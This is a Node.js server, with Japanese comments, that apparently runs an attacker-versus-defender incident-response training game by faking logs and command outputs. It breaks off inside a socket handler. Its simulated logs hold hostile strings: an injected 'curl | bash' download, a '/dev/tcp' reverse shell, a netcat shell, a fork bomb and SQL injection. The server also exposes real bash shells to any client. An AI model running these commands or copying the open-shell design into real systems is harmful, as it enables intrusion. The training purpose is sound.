const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const pty = require('node-pty');
const fs = require('fs');

const app = express();
app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] }
});

// ─── ゲーム状態の管理 ─────────────────────────────────────────
const rooms = {};

function getRoom(roomId) {
  if (!rooms[roomId]) {
    rooms[roomId] = {
      id: roomId,
      phase: 'WAITING', // WAITING | IDLE | ATTACKING | ATTACK_SUCCESS | BLOCKED | COMPLETED
      attackerSocketId: null,
      defenderSocketId: null,
      blockedSocketIds: new Set(),
      attackType: null,
      attackPid: Math.floor(Math.random() * 9000) + 1000,
      attackerIp: '203.0.113.' + (Math.floor(Math.random() * 200) + 10), // ランダム生成
      ipBlocked: false,
      processKilled: false,
      fileRemoved: false,
      // ---- 新規攻撃用の防御フラグ ----
      sysctlApplied: false,
      cronRemoved: false,
      sshKeyRemoved: false,
      lkmRemoved: false,
      ptyProcess: null,
      availableTargetIps: Array.from({ length: 10 }, () => `192.168.1.${Math.floor(Math.random() * 150) + 50}`),
      targetIp: null,
    };
  }
  return rooms[roomId];
}

function broadcastRoomsStatus() {
  const status = Object.keys(rooms).map(id => {
    const r = rooms[id];
    return {
      id,
      hasAttacker: !!r.attackerSocketId,
      hasDefender: !!r.defenderSocketId,
      phase: r.phase
    };
  });
  // 常時ルームリストとして 1~3は存在しているように見せる
  ['ROOM1', 'ROOM2', 'ROOM3'].forEach(r => {
    if (!status.find(s => s.id === r)) status.push({ id: r, hasAttacker: false, hasDefender: false, phase: 'WAITING' });
  });
  io.emit('rooms_status', status);
}

function checkMatchStart(roomId) {
  const r = rooms[roomId];
  if (r.attackerSocketId && r.defenderSocketId && r.phase === 'WAITING') {
    r.phase = 'SELECTING_IP';
    io.to(roomId).emit('match_started', { message: '対戦相手が見つかりました。防御側がIPアドレスを選択中です...' });
    io.to(roomId).emit('game_state', getPublicState(r));
    broadcastRoomsStatus();
  }
}

function getPublicState(r) {
  return {
    phase: r.phase,
    attackType: r.attackType,
    attackerIp: r.attackerIp,
    availableTargetIps: r.availableTargetIps,
    targetIp: r.phase === 'SELECTING_IP' || r.phase === 'DISCOVERING' ? null : r.targetIp, // Hide until discovered
  };
}

// ─── ダミーDBデータ ─────────────────────────────────────────
const DUMMY_DB = {
  users: [
    { id: 1, username: 'admin', password_hash: '$2b$12$xK8LnW...', email: 'admin@company.local', role: 'administrator' },
    { id: 2, username: 'tanaka', password_hash: '$2b$12$mP3qRt...', email: 'tanaka@company.local', role: 'developer' },
    { id: 3, username: 'yamamoto', password_hash: '$2b$12$vL9sXu...', email: 'yamamoto@company.local', role: 'developer' },
    { id: 4, username: 'sato', password_hash: '$2b$12$nQ4rSv...', email: 'sato@company.local', role: 'hr' },
  ],
  secrets: [
    { key: 'API_KEY', value: 'sk-prod-aG9uZXlwb3QK' },
    { key: 'DB_PASSWORD', value: 'Pr0d_DB_P@ssw0rd!' },
    { key: 'SMTP_PASS', value: 'smtp_s3cr3t_2024' },
  ]
};

// ─── ダミーアクセスログ（攻撃前に偽装されたノイズも含む）───────
function generateLogs(room, logType, includeAttack = false) {
  const ip = includeAttack ? room.attackerIp : '10.5.5.5';

  if (logType === 'auth') {
    const normal = [
      'Mar  1 08:12:04 server sshd[1234]: Accepted publickey for deploy from 10.0.0.5 port 52341 ssh2',
    ];
    if (includeAttack && room.attackType === 'ssh') {
      return [...normal,
      `Mar  1 11:45:01 server sshd[2001]: Failed password for root from ${ip} port 51234 ssh2`,
      `Mar  1 11:45:02 server sshd[2002]: Failed password for root from ${ip} port 51235 ssh2`,
      `Mar  1 11:45:03 server sshd[2003]: Failed password for admin from ${ip} port 51236 ssh2`,
      `Mar  1 11:45:04 server sshd[2004]: Failed password for admin from ${ip} port 51237 ssh2`,
      `Mar  1 11:45:07 server sshd[2007]: Accepted password for admin from ${ip} port 51240 ssh2`,
      ];
    }
    if (includeAttack && room.attackType === 'privesc') {
      return [...normal,
        `Mar  1 11:47:01 server sudo:    tanaka : TTY=pts/0 ; PWD=/home/tanaka ; USER=root ; COMMAND=/bin/bash`,
      ];
    }
    return normal;
  }

  if (logType === 'access') {
    const normal = [
      '192.168.1.50 - - [01/Mar/2025:10:00:00 +0900] "GET / HTTP/1.1" 200 1024 "-" "Mozilla/5.0"',
    ];
    if (includeAttack && room.attackType === 'sqli') {
      return [...normal, `${ip} - - [01/Mar/2025:11:45:05 +0900] "GET /login.php?user=admin' OR '1'='1 HTTP/1.1" 200 4096 "-" "SQLMap/1.6"`];
    }
    if (includeAttack && room.attackType === 'rce') {
      return [...normal, `${ip} - - [01/Mar/2025:11:45:10 +0900] "POST /api/upload HTTP/1.1" 200 256 "-" "curl/7.68.0"`];
    }
    if (includeAttack && room.attackType === 'ddos') {
      const flood = Array(8).fill(`${ip} - - [01/Mar/2025:11:46:00 +0900] "GET / HTTP/1.1" 503 503 "-" "BotNet/1.0"`);
      return [...normal, ...flood];
    }
    if (includeAttack && room.attackType === 'xss') {
      return [...normal, `${ip} - - [01/Mar/2025:11:45:05 +0900] "POST /forum/post HTTP/1.1" 200 512 "-" "Mozilla/5.0"`];
    }
    if (includeAttack && room.attackType === 'oscmd') {
      return [...normal, `${ip} - - [01/Mar/2025:11:45:05 +0900] "POST /ping?ip=127.0.0.1;curl%20-s%20${ip}/bd.sh|bash HTTP/1.1" 200 512 "-" "curl/7.68.0"`];
    }
    return normal;
  }

  if (logType === 'syslog') {
    const normal = ['Mar  1 00:00:00 server systemd[1]: Starting Cleanup...'];
    if (includeAttack && room.attackType === 'ransomware') {
      return [...normal, `Mar  1 11:45:30 server kernel: [123456.78] encrypt process creating unusually high I/O`, `Mar  1 11:45:31 server encrypt: Processing /var/www/html`];
    }
    if (includeAttack && (room.attackType === 'rce' || room.attackType === 'oscmd')) {
      return [...normal, `Mar  1 11:45:15 server kernel: [123456.78] Possible reverse shell detected (bash -i >& /dev/tcp/${ip}/4444 0>&1)`];
    }
    if (includeAttack && room.attackType === 'forkbomb') {
      return [...normal, `Mar  1 11:45:15 server kernel: [123456.78] cgroup: fork rejected by pids controller in /user.slice/user-1000.slice`];
    }
    if (includeAttack && room.attackType === 'rootkit') {
      return [...normal, `Mar  1 11:45:15 server kernel: [123456.78] sys_call_table hooked! \nMar  1 11:45:15 server kernel: [123456.79] hiding process specific PIDs`];
    }
    if (includeAttack && room.attackType === 'cron') {
      return [...normal, `Mar  1 11:45:15 server CRON[12345]: (root) CMD (/tmp/.hidden/bd.sh)`];
    }
    return normal;
  }

  if (logType === 'vsftpd') {
    const normal = ['Sat Mar  1 09:00:00 2025 [pid 1234] CONNECT: Client "10.0.0.5"'];
    if (includeAttack && room.attackType === 'ftp') {
      return [...normal, `Sat Mar  1 11:45:01 2025 [pid 5678] CONNECT: Client "${ip}"`, `Sat Mar  1 11:45:05 2025 [pid 5678] OK UPLOAD: Client "${ip}", "/pub/malware.exe", 102400 bytes`];
    }
    if (includeAttack && room.attackType === 'nmap') {
      return [...normal, `Sat Mar  1 11:45:01 2025 [pid 1111] CONNECT: Client "${ip}"`, `Sat Mar  1 11:45:01 2025 [pid 1111] FAIL LOGIN: Client "${ip}"`];
    }
    return normal;
  }
  return [];
}

function generateNetstatOutput(room) {
  const isAttack = room.phase !== 'WAITING' && room.phase !== 'IDLE';
  const out = [
    'Active Internet connections (servers and established)',
    'Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name',
    `tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      987/sshd`,
    `tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      1023/mysqld`,
  ];
  if (isAttack && !room.ipBlocked) {
    if (['ssh', 'nmap'].includes(room.attackType)) {
      out.push(`tcp        0    208 192.168.1.100:22         ${room.attackerIp}:51240  ESTABLISHED 2007/sshd`);
    }
    if (['rce', 'oscmd'].includes(room.attackType) && !room.processKilled) {
      out.push(`tcp        0      0 192.168.1.100:4444      ${room.attackerIp}:53892  ESTABLISHED ${room.attackPid}/nc`);
    }
    if (['ddos'].includes(room.attackType)) {
      for (let i = 0; i < 3; i++) {
        out.push(`tcp        0      0 192.168.1.100:80        ${room.attackerIp}:${30000 + i}  SYN_RECV    -`);
      }
    }
    if (['ftp'].includes(room.attackType)) {
      out.push(`tcp        0      0 192.168.1.100:21        ${room.attackerIp}:43210  ESTABLISHED 5678/vsftpd`);
    }
  }
  out.push(`tcp        0      0 127.0.0.1:3306          127.0.0.1:51001         ESTABLISHED 1023/mysqld`);
  out.push(`tcp6       0      0 :::80                   :::*                    LISTEN      456/nginx`);
  return out.join('\\n');
}

// ─── 全体状態をリセット ────────────────────────────────────────
function resetRoom(roomId) {
  if (rooms[roomId]) {
    rooms[roomId].phase = 'WAITING';
    rooms[roomId].blockedSocketIds = new Set();
    rooms[roomId].attackType = null;
    rooms[roomId].ipBlocked = false;
    rooms[roomId].processKilled = false;
    rooms[roomId].fileRemoved = false;
    rooms[roomId].sysctlApplied = false;
    rooms[roomId].cronRemoved = false;
    rooms[roomId].sshKeyRemoved = false;
    rooms[roomId].lkmRemoved = false;
    if (rooms[roomId].attackerPtyProcess) {
      rooms[roomId].attackerPtyProcess.kill();
      rooms[roomId].attackerPtyProcess = null;
    }
    rooms[roomId].attackerSocketId = null;
    rooms[roomId].defenderSocketId = null;
    rooms[roomId].attackPid = Math.floor(Math.random() * 9000) + 1000;
  }
}

// ─── PTY 初期化 ──────────────────────────────────────────────
function initPty(roomId) {
  const r = getRoom(roomId);
  if (r.ptyProcess) return;

  const rcFile = `/tmp/.bashrc_${roomId}`;
  const bashrcContent = `
export PS1="defender@server:~$ "
alias help="echo 'Available commands: iptables, kill, rm, investigate, tail, netstat, ps, ss, dmesg, free, lsof, sysctl, crontab, cat, lsmod, rmmod'"
iptables() {
  if [[ "$1" == "-A" && "$2" == "INPUT" && "$3" == "-s" && "$5" == "-j" && "$6" == "DROP" ]]; then
    curl -s -X POST http://127.0.0.1:3000/internal/block -H "Content-Type: application/json" -d "{\\"roomId\\":\\"${roomId}\\", \\"ip\\":\\"$4\\"}" > /dev/null
  else
    echo "iptables v1.8.7"
  fi
}
investigate() {
  curl -s -X POST http://127.0.0.1:3000/internal/investigate -H "Content-Type: application/json" -d "{\\"roomId\\":\\"${roomId}\\"}" > /dev/null
}
kill() {
  if [[ "$1" == "-9" ]]; then
    PID=$2
  else
    PID=$1
  fi
  curl -s -X POST http://127.0.0.1:3000/internal/kill -H "Content-Type: application/json" -d "{\\"roomId\\":\\"${roomId}\\", \\"pid\\":\\"$PID\\"}" > /dev/null
}
rm() {
  if [[ "$*" == *"/tmp/.hidden"* || "$*" == *"webshell"* || "$*" == *"encrypt"* || "$*" == *"malware"* || "$*" == *"/etc/cron.d/"* || "$*" == *".ssh/authorized_keys"* ]]; then
    curl -s -X POST http://127.0.0.1:3000/internal/rm -H "Content-Type: application/json" -d "{\\"roomId\\":\\"${roomId}\\", \\"path\\":\\"rm $*\\"}" > /dev/null
  fi
  /bin/rm "$@"
}
cat() {
  if [[ "$*" == *".ssh/authorized_keys"* ]]; then
    curl -s -X POST http://127.0.0.1:3000/internal/cat_ssh_keys -H "Content-Type: application/json" -d "{\\"roomId\\":\\"${roomId}\\"}"
  else
    /bin/cat "$@"
  fi
}
tail() {
  if [[ "$*" == *"/var/log/auth.log"* ]]; then
    curl -s http://127.0.0.1:3000/internal/logs?roomId=${roomId}\\&type=auth
  elif [[ "$*" == *"/var/log/nginx/access.log"* ]]; then
    curl -s http://127.0.0.1:3000/internal/logs?roomId=${roomId}\\&type=access
  elif [[ "$*" == *"/var/log/syslog"* ]]; then
    curl -s http://127.0.0.1:3000/internal/logs?roomId=${roomId}\\&type=syslog
  elif [[ "$*" == *"/var/log/vsftpd.log"* ]]; then
    curl -s http://127.0.0.1:3000/internal/logs?roomId=${roomId}\\&type=vsftpd
  else
    /usr/bin/tail "$@"
  fi
}
netstat() {
  if [[ "$*" == *"-an"* ]]; then
    curl -s http://127.0.0.1:3000/internal/netstat?roomId=${roomId}
  else
    /bin/netstat "$@"
  fi
}
ps() {
  if [[ "$*" == *"aux"* ]]; then
    curl -s http://127.0.0.1:3000/internal/ps?roomId=${roomId}
  else
    /bin/ps "$@"
  fi
}
ss() {
  curl -s http://127.0.0.1:3000/internal/ss?roomId=${roomId}
}
dmesg() {
  curl -s http://127.0.0.1:3000/internal/dmesg?roomId=${roomId}
}
free() {
  curl -s http://127.0.0.1:3000/internal/free?roomId=${roomId}
}
lsof() {
  curl -s http://127.0.0.1:3000/internal/lsof?roomId=${roomId}
}
sysctl() {
  if [[ "$*" == *"-w net.ipv4.tcp_syncookies=1"* ]]; then
    curl -s -X POST http://127.0.0.1:3000/internal/sysctl -H "Content-Type: application/json" -d "{\\"roomId\\":\\"${roomId}\\"}"
  else
    echo "sysctl: permission denied or key not found"
  fi
}
crontab() {
  if [[ "$*" == *"-l"* ]]; then
    curl -s -X POST http://127.0.0.1:3000/internal/crontab_l -H "Content-Type: application/json" -d "{\\"roomId\\":\\"${roomId}\\"}"
  else
    /usr/bin/crontab "$@"
  fi
}
lsmod() {
  curl -s http://127.0.0.1:3000/internal/lsmod?roomId=${roomId}
}
rmmod() {
  curl -s -X POST http://127.0.0.1:3000/internal/rmmod -H "Content-Type: application/json" -d "{\\"roomId\\":\\"${roomId}\\", \\"module\\":\\"$1\\"}"
}
`;
  fs.writeFileSync(rcFile, bashrcContent);

  r.ptyProcess = pty.spawn('bash', ['--rcfile', rcFile, '-i'], {
    name: 'xterm-color',
    cols: 80,
    rows: 24,
    cwd: '/root',
    env: process.env
  });

  r.ptyProcess.onData((data) => {
    io.to(roomId).emit('pty_output', { output: data });
  });
}

function initAttackerPty(roomId) {
  const r = getRoom(roomId);
  if (r.attackerPtyProcess) return;

  const rcFile = `/tmp/.bashrc_attacker_${roomId}`;
  const bashrcContent = `
export PS1="attacker@kali:~# "
alias nmap="echo 'Starting Nmap...'; sleep 1; echo 'PORT   STATE SERVICE'; echo '22/tcp open  ssh'; echo '80/tcp open  http'"
alias hydra="echo 'Hydra v9.1 (c) 2020 by van Hauser/THC'; sleep 2; echo '[22][ssh] host: ${r.targetIp || '192.168.1.100'}   login: admin   password: password123'"
alias ssh="echo 'Welcome to Ubuntu 20.04.2 LTS'; echo 'admin@ubuntu:~# '"
alias sqlmap="echo 'sqlmap resumed the following injection point(s)...'; sleep 1; echo 'web database dumped.'"
alias slowhttptest="echo 'Slow HTTP test started...'"
alias ab="echo 'Benchmarking...'; sleep 1; echo 'Percentage of the requests served within a certain time (ms)'"
alias ping="echo 'PING 192.168.1.100 (192.168.1.100) 56(84) bytes of data.'; echo '64 bytes from 192.168.1.100: icmp_seq=1 ttl=64 time=0.034 ms'"
alias wget="echo 'Saving to: ransomware.elf'"
alias curl="echo 'HTTP/1.1 200 OK'"
alias nc="echo 'Listening on [0.0.0.0] (family 0, port 4444)'; sleep 1; echo 'Connection received on 192.168.1.100'"
alias ftp="echo 'Connected to 192.168.1.100. 220 (vsFTPd 3.0.3)'"
alias sudo="echo 'root@ubuntu:~#'"
alias hping3="echo 'HPING 192.168.1.100: NO FLAGS are set, 40 headers + 0 data bytes'"
alias git="echo 'Cloning into diamorphine...'"
alias make="echo 'make[1]: Entering directory /usr/src/linux-headers'"
alias insmod="echo 'Module inserted.'"
alias ssh-keygen="echo 'Generating public/private rsa key pair.'"
alias scp="echo 'mykey.pub 100% 398 1.1MB/s 00:00'"
`;
  fs.writeFileSync(rcFile, bashrcContent);

  r.attackerPtyProcess = pty.spawn('bash', ['--rcfile', rcFile, '-i'], {
    name: 'xterm-color',
    cols: 80,
    rows: 24,
    cwd: '/root',
    env: process.env
  });

  r.attackerPtyProcess.onData((data) => {
    if (r.attackerSocketId) {
      io.to(r.attackerSocketId).emit('attacker_pty_output', { output: data });
    }
  });
}

// ─── HTTP エンドポイント ──────────────────────────────────────
app.get('/', (req, res) => res.send('Security Sandbox API is running'));
app.get('/rooms', (req, res) => {
  broadcastRoomsStatus();
  res.json({ success: true });
});

app.post('/internal/block', (req, res) => {
  const { roomId, ip } = req.body;
  const r = getRoom(roomId);
  if (!r) return res.json({ success: false });

  if (ip !== r.attackerIp) {
    if (r.ptyProcess) r.ptyProcess.write(`\niptables: ルールを追加: -s ${ip} -j DROP\ndefender@server:~$ `);
    io.to(r.id).emit('block_result', { success: false, message: `${ip}: ホストへのルートがありません` });
    return res.json({ success: false });
  }

  r.ipBlocked = true;

  if (r.attackerSocketId) {
    r.blockedSocketIds.add(r.attackerSocketId);
    io.to(r.attackerSocketId).emit('force_logout', { reason: 'Connection closed by remote host.' });
  }

  if (r.ptyProcess) r.ptyProcess.write(`\niptables: ルールを追加: -s ${ip} -j DROP\ndefender@server:~$ `);

  io.to(r.id).emit('block_result', {
    success: true,
    message: `iptables: ルールを追加: -s ${ip} -j DROP`,
  });

  checkGameClear(r);

  res.json({ success: true });
});

app.post('/internal/investigate', (req, res) => {
  const { roomId } = req.body;
  const r = getRoom(roomId);
  if (!r) return res.json({ success: false });

  const candidates = [
    { id: 'a', path: '/var/log/nginx/access.log', description: 'Webサーバーのアクセスログ（サイズ: 2.3MB）', isCorrect: false },
    { id: 'b', path: '/var/lib/mysql/company_db/', description: 'MySQLデータベースファイル（最終変更: 11:45:08）', isCorrect: true },
    { id: 'c', path: '/etc/passwd', description: 'システムユーザーファイル（変更なし）', isCorrect: false },
    { id: 'd', path: '/var/www/html/', description: 'Webコンテンツディレクトリ（変更なし）', isCorrect: false },
  ];

  if (r.ptyProcess) r.ptyProcess.write(`\n被害調査を開始します...\ndefender@server:~$ `);
  io.to(r.id).emit('damage_report', {
    candidates, dbStolen: r.dbStolen, backdoorActive: r.backdoorActive, backdoorPid: r.backdoorPid,
  });
  res.json({ success: true });
});

app.post('/internal/kill', (req, res) => {
  const { roomId, pid } = req.body;
  const r = getRoom(roomId);
  if (!r) return res.json({ success: false });

  if (parseInt(pid) === r.attackPid) {
    r.processKilled = true;
    if (r.ptyProcess) r.ptyProcess.write(`\nTerminated PID ${pid}\ndefender@server:~$ `);
    io.to(r.id).emit('action_result', { success: true, method: 'kill', value: pid });
    checkGameClear(r);
  } else {
    if (r.ptyProcess) r.ptyProcess.write(`\nkill: cannot find process "${pid}"\ndefender@server:~$ `);
    io.to(r.id).emit('action_result', { success: false, message: `${pid}: コマンドが正しくありません` });
  }
  res.json({ success: true });
});

app.post('/internal/rm', (req, res) => {
  const { roomId, path } = req.body;
  const r = getRoom(roomId);
  if (!r) return res.json({ success: false });

  if (path.includes('/tmp/.hidden') || path.includes('encrypt') || path.includes('malware')) {
    r.fileRemoved = true;
    if (r.ptyProcess) r.ptyProcess.write(`\ndefender@server:~$ `);
    io.to(r.id).emit('action_result', { success: true, method: 'rm', value: path });
    checkGameClear(r);
  } else {
    io.to(r.id).emit('action_result', { success: false, message: `${path}: コマンドが正しくありません` });
  }
  res.json({ success: true });
});

function checkGameClear(r) {
  let cleared = false;
  // シンプルなクリア判定ロジック
  if (['ssh', 'sqli', 'ddos', 'xss', 'oscmd', 'nmap', 'dnsamp'].includes(r.attackType)) {
    // Basic IP block
    if (r.ipBlocked) cleared = true;
  } else if (r.attackType === 'ransomware') {
    // Process killed
    if (r.processKilled) cleared = true;
  } else if (r.attackType === 'rce' || r.attackType === 'privesc') {
    // IP block + Process killed
    if (r.ipBlocked && r.processKilled) cleared = true;
  } else if (r.attackType === 'ftp') {
    // IP block + File removed
    if (r.ipBlocked && r.fileRemoved) cleared = true;
  } else if (r.attackType === 'synflood') {
    // Sysctl applied
    if (r.sysctlApplied) cleared = true;
  } else if (r.attackType === 'forkbomb') {
    // Kill processes
    if (r.processKilled) cleared = true; // In simplified reality, killing the initial script terminates the bomb
  } else if (r.attackType === 'slowloris') {
    // IP blocked
    if (r.ipBlocked) cleared = true;
  } else if (r.attackType === 'cron') {
    // Cron jobs removed
    if (r.fileRemoved) cleared = true;
  } else if (r.attackType === 'sshkey') {
    // SSH key removed
    if (r.fileRemoved) cleared = true;
  } else if (r.attackType === 'rootkit') {
    // LKM removed
    if (r.lkmRemoved) cleared = true;
  }

  if (cleared && r.phase !== 'COMPLETED') {
    io.to(r.id).emit('game_clear', { message: 'インシデント対応完了。脅威を排除し、被害を食い止めました。' });
    io.to(r.id).emit('game_state', getPublicState(r));
    // 攻撃者側もブロックにする
    if (r.attackerSocketId) {
      r.blockedSocketIds.add(r.attackerSocketId);
      io.to(r.attackerSocketId).emit('force_logout', { reason: 'System secured by defender.' });
    }
  }
}

app.get('/internal/logs', (req, res) => {
  const r = getRoom(req.query.roomId);
  const type = req.query.type || 'auth';
  if (!r) return res.send('');
  const includeAttack = r.phase !== 'WAITING' && r.phase !== 'IDLE';
  const logs = generateLogs(r, type, includeAttack);
  res.send(logs.join('\\n') + '\\n');
});

app.get('/internal/netstat', (req, res) => {
  const r = getRoom(req.query.roomId);
  if (!r) return res.send('');
  res.send(generateNetstatOutput(r) + '\\n');
});

app.get('/internal/ps', (req, res) => {
  const r = getRoom(req.query.roomId);
  if (!r) return res.send('');
  const isAttack = r.phase !== 'WAITING' && r.phase !== 'IDLE';
  const lines = [
    `USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND`,
    `root           1  0.0  0.1 103444 10220 ?        Ss   08:00   0:01 /sbin/init`,
    `root         987  0.0  0.1  72312  5860 ?        Ss   08:00   0:00 sshd: /usr/sbin/sshd -D`,
    `root        1023  0.0  1.2 589672 51200 ?        Ssl  08:00   0:08 /usr/sbin/mysqld`,
  ];
  if (isAttack) {
    if (['ssh'].includes(r.attackType)) {
      lines.push(`root        2007  0.0  0.0  14548  3200 ?        Ss   11:45   0:00 sshd: admin [priv]`);
    } else if (r.attackType === 'ransomware' && !r.processKilled) {
      lines.push(`root        ${r.attackPid}  99.9  1.0  10240  2048 ?        R    11:45   1:00 /tmp/encrypt /var/www`);
    } else if (['rce', 'oscmd'].includes(r.attackType) && !r.processKilled) {
      lines.push(`www-data    ${r.attackPid}  0.0  0.0   2444   904 ?        S    11:45   0:00 nc -lnvp 4444 -e /bin/bash`);
    } else if (r.attackType === 'privesc' && !r.processKilled) {
      lines.push(`root        ${r.attackPid}  0.0  0.0   2444   904 pts/0  S    11:47   0:00 /bin/bash`);
    } else if (r.attackType === 'forkbomb' && !r.processKilled) {
      for (let i = 0; i < 5; i++) {
        lines.push(`www-data    ${r.attackPid + i} 99.9  0.1   1200   400 ?        R    11:45   0:10 sh -c :|:&`);
      }
    }
  }
  res.send(lines.join('\\n') + '\\n');
});

// --- 新規追加の仮想コマンド用エンドポイント ---

app.get('/internal/ss', (req, res) => {
  const r = getRoom(req.query.roomId);
  if (!r) return res.send('');
  const isAttack = r.phase !== 'WAITING' && r.phase !== 'IDLE';
  const lines = [
    'Total: 156',
    'TCP:   12 (estab 2, closed 0, orphaned 0, timewait 0)',
    '',
    'Transport Total     IP        IPv6',
    'RAW       0         0         0',
    'UDP       4         3         1',
    'TCP       12        10        2',
    'INET      16        13        3',
    'FRAG      0         0         0'
  ];

  if (isAttack && r.attackType === 'synflood') {
    lines[0] = 'Total: 20156';
    lines[1] = 'TCP:   20012 (estab 2, closed 0, orphaned 0, timewait 0)';
    lines[6] = 'TCP       20012     20010     2';
    lines[7] = 'INET      20016     20013     3';
    lines.push('', '--- High number of SYN-RECV half-open connections detected ---');
  } else if (isAttack && r.attackType === 'slowloris') {
    lines[0] = 'Total: 10156';
    lines[1] = 'TCP:   10012 (estab 10000, closed 0, orphaned 0, timewait 0)';
    lines[6] = 'TCP       10012     10010     2';
    lines.push('', '--- High number of ESTABLISHED connections with incomplete HTTP headers ---');
  }

  res.send(lines.join('\\n') + '\\n');
});

app.get('/internal/dmesg', (req, res) => {
  const r = getRoom(req.query.roomId);
  if (!r) return res.send('');
  const isAttack = r.phase !== 'WAITING' && r.phase !== 'IDLE';
  const lines = [
    '[    0.000000] Linux version 5.15.0-generic ...',
    '[   12.345678] eth0: link up, 1000Mbps, full-duplex'
  ];

  if (isAttack) {
    if (r.attackType === 'synflood') {
      lines.push(`[ 1234.567801] TCP: request_sock_TCP: Possible SYN flooding on port 80. Sending cookies.  Check SNMP counters.`);
      lines.push(`[ 1234.567805] TCP: request_sock_TCP: Possible SYN flooding on port 80. Dropping request.`);
    } else if (r.attackType === 'forkbomb') {
      lines.push(`[ 1234.888888] cgroup: fork rejected by pids controller in /user.slice/user-1000.slice`);
      lines.push(`[ 1234.888890] Out of memory: Killed process ${r.attackPid} (sh) total-vm:1200kB, anon-vm:400kB, file-vm:0kB`);
    } else if (r.attackType === 'rootkit') {
      lines.push(`[ 1230.111111] sys_call_table hooked!`);
      lines.push(`[ 1230.111115] hiding process specific PIDs`);
    }
  }
  res.send(lines.join('\\n') + '\\n');
});

app.get('/internal/free', (req, res) => {
  const r = getRoom(req.query.roomId);
  if (!r) return res.send('');
  const isAttack = r.phase !== 'WAITING' && r.phase !== 'IDLE';

  if (isAttack && r.attackType === 'forkbomb' && !r.processKilled) {
    res.send('               total        used        free      shared  buff/cache   available\\nMem:           4048         4020          10           0          18          10\\nSwap:          2048         2048           0\\n');
  } else {
    res.send('               total        used        free      shared  buff/cache   available\\nMem:           4048          512        2024          10        1512        3124\\nSwap:          2048            0        2048\\n');
  }
});

app.get('/internal/lsof', (req, res) => {
  const r = getRoom(req.query.roomId);
  if (!r) return res.send('');
  const isAttack = r.phase !== 'WAITING' && r.phase !== 'IDLE';
  const lines = [
    'COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF NODE NAME',
    'nginx     456   root  10u  IPv4  12345      0t0  TCP *:http (LISTEN)'
  ];

  if (isAttack && r.attackType === 'slowloris') {
    lines.push(`nginx     456   root  11u  IPv4  12346      0t0  TCP 192.168.1.100:http->${r.attackerIp}:30001 (ESTABLISHED)`);
    lines.push(`nginx     456   root  12u  IPv4  12347      0t0  TCP 192.168.1.100:http->${r.attackerIp}:30002 (ESTABLISHED)`);
    lines.push(`nginx     456   root  ...u  IPv4  .....      ...  TCP (10000+ file descriptors exhausted)`);
  }
  res.send(lines.join('\\n') + '\\n');
});

app.post('/internal/sysctl', (req, res) => {
  const { roomId } = req.body;
  const r = getRoom(roomId);
  if (!r) return res.json({ success: false });

  r.sysctlApplied = true;
  if (r.ptyProcess) r.ptyProcess.write(`\nnet.ipv4.tcp_syncookies = 1\ndefender@server:~$ `);
  io.to(r.id).emit('action_result', { success: true, method: 'sysctl' });
  checkGameClear(r);
  res.json({ success: true });
});

app.post('/internal/crontab_l', (req, res) => {
  const { roomId } = req.body;
  const r = getRoom(roomId);
  if (!r) return res.json({ success: false });

  const isAttack = r.phase !== 'WAITING' && r.phase !== 'IDLE';
  const lines = ['# m h  dom mon dow   command'];
  if (isAttack && r.attackType === 'cron' && !r.cronRemoved) {
    if (r.ptyProcess) r.ptyProcess.write(`\n* * * * * /tmp/.hidden/bd.sh\ndefender@server:~$ `);
  } else {
    if (r.ptyProcess) r.ptyProcess.write(`\nno crontab for root\ndefender@server:~$ `);
  }
  res.json({ success: true });
});

app.post('/internal/cat_ssh_keys', (req, res) => {
  const { roomId } = req.body;
  const r = getRoom(roomId);
  if (!r) return res.json({ success: false });

  const isAttack = r.phase !== 'WAITING' && r.phase !== 'IDLE';
  if (isAttack && r.attackType === 'sshkey' && !r.sshKeyRemoved) {
    if (r.ptyProcess) r.ptyProcess.write(`\nssh-rsa AAAAB3NzaC1yc... attacker@hacker.io\ndefender@server:~$ `);
  } else {
    if (r.ptyProcess) r.ptyProcess.write(`\ncat: .ssh/authorized_keys: No such file or directory\ndefender@server:~$ `);
  }
  res.json({ success: true });
});

app.get('/internal/lsmod', (req, res) => {
  const r = getRoom(req.query.roomId);
  if (!r) return res.send('');
  const isAttack = r.phase !== 'WAITING' && r.phase !== 'IDLE';
  const lines = [
    'Module                  Size  Used by',
    'iptable_nat            16384  0',
    'nf_nat                 49152  1 iptable_nat'
  ];
  if (isAttack && r.attackType === 'rootkit' && !r.lkmRemoved) {
    lines.unshift('diamorphine            20480  0  [permanent]');
  }
  res.send(lines.join('\\n') + '\\n');
});

app.post('/internal/rmmod', (req, res) => {
  const { roomId, module } = req.body;
  const r = getRoom(roomId);
  if (!r) return res.json({ success: false });

  if (module === 'diamorphine' && r.attackType === 'rootkit') {
    r.lkmRemoved = true;
    if (r.ptyProcess) r.ptyProcess.write(`\ndefender@server:~$ `);
    io.to(r.id).emit('action_result', { success: true, method: 'rmmod' });
    checkGameClear(r);
  } else if (module) {
    if (r.ptyProcess) r.ptyProcess.write(`\nrmmod: ERROR: Module ${module} is in use\ndefender@server:~$ `);
  } else {
    if (r.ptyProcess) r.ptyProcess.write(`\nrmmod: ERROR: missing module name\ndefender@server:~$ `);
  }
  res.json({ success: true });
});

// ─── Socket.IO ────────────────────────────────────────────────
io.on('connection', (socket) => {
  console.log(`[+] Connected: ${socket.id}`);

  socket.on('get_rooms', () => {
    broadcastRoomsStatus();
  });

  socket.on('pty_input', ({ input }) => {
    const r = getRoom(socket.roomId);
    if (!r) return;
    if (socket.role === 'ATTACKER' && r.attackerPtyProcess) {
      r.attackerPtyProcess.write(input);
    } else if (socket.role === 'DEFENDER' && r.ptyProcess) {
      r.ptyProcess.write(input);
    }
  });

  socket.on('pty_resize', ({ cols, rows }) => {
    const r = getRoom(socket.roomId);
    if (!r) return;
    if (socket.role === 'ATTACKER' && r.attackerPtyProcess) {
      r.attackerPtyProcess.resize(cols, rows);
    } else if (socket.role === 'DEFENDER' && r.ptyProcess) {
      r.ptyProcess.resize(cols, rows);
    }
  });

  socket.on('join_room', ({ roomId, role }) => {
    socket.join(roomId);
